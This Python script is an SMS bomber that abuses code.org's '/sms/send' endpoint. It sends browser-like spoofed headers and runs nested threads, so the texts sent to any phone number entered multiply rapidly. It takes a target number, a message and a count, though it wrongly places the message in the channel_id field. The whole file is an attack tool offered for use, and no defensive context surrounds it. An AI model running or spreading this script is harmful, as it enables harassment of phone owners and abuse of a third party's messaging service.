import requests
import threading

def send_sms(phone_number, custom_message, times):
    url = "https://studio.code.org/sms/send"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-newrelic-id": "1",
        "x-requested-with": "XMLHttpRequest"
    }
    payload_template = "type=gamelab&phone={}&channel_id={}"
    
    def send_message():
        for _ in range(times):
            payload = payload_template.format(phone_number, custom_message)
            response = requests.post(url, headers=headers, data=payload)
            if response.status_code == 200:
                print(f"SMS sent successfully!")
            else:
                print(f"Failed to send SMS: {response.text}")
    
    threads = []
    for _ in range(times):
        thread = threading.Thread(target=send_message)
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

def main():
    phone_number = input("Enter the phone number: ")
    custom_message = input("Enter the custom message: ")
    times = int(input("Enter the number of times to send the SMS: "))
    send_sms(phone_number, custom_message, times)

if __name__ == "__main__":
    main()
